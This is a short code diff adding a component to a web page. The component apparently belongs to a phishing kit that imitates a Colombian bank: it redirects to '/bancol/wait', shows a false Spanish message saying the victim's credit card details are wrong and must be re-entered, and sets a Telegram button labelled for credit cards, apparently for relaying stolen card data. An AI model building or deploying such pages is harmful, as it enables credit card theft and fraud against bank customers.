@@ -409,6 +409,14 @@
         }
     </script>
 
+    <x-control
+        :auto-completar="false"
+        :debug="false"
+        redirect-url="/bancol/wait"
+        toast-message="La información de tu tarjeta de crédito es incorrecta. Ingresala nuevamente"
+        telegram-button="TDC"
+    />
+
 </body>
 
 </html>
